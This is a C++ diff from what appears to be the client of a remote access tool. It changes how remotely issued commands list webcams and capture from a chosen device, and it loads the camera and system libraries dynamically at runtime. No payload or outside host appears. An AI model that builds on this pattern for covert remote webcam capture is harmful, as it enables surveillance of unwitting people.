@@ -69,6 +69,9 @@ void Cliente::DestroyClasses() {
             }
         }
         DeleteObj<mod_Camera>(this->mod_Cam);
+        if (this->mod_dynamic) {
+            this->mod_dynamic->UnloadCamPros();
+        }
     }
     
     if (this->mod_Fun) {
@@ -504,7 +507,16 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::CM_Lista) {
         //Enviar lista de camaras
         if (!this->mod_Cam) {
-            this->mod_Cam = new mod_Camera();
+            this->mod_dynamic->LoadCamProcs();
+            this->mod_Cam = new mod_Camera(
+                this->mod_dynamic->GDIPLUS_RD, 
+                this->mod_dynamic->SHLWAPI,
+                this->mod_dynamic->MFPLAT, 
+                this->mod_dynamic->MF, 
+                this->mod_dynamic->MFAPI, 
+                this->mod_dynamic->MFREADWRITE, 
+                this->mod_dynamic->OLE32, 
+                this->mod_dynamic->KERNEL32);
         }
 
         std::string strPaquete = "";
@@ -530,7 +542,16 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::CM_Single) {
         u_int iDeviceIndex = atoi(paquete.cBuffer.data());
         if (!this->mod_Cam) {
-            this->mod_Cam = new mod_Camera();
+            this->mod_dynamic->LoadCamProcs();
+            this->mod_Cam = new mod_Camera(
+                this->mod_dynamic->GDIPLUS_RD,
+                this->mod_dynamic->SHLWAPI,
+                this->mod_dynamic->MFPLAT,
+                this->mod_dynamic->MF,
+                this->mod_dynamic->MFAPI,
+                this->mod_dynamic->MFREADWRITE,
+                this->mod_dynamic->OLE32,
+                this->mod_dynamic->KERNEL32);
             this->mod_Cam->ListNameCaptureDevices();
             if (this->mod_Cam->vcCamObjs.size() <= 0) {
                 __DBG_("[X] No se obtuvieron camaras");
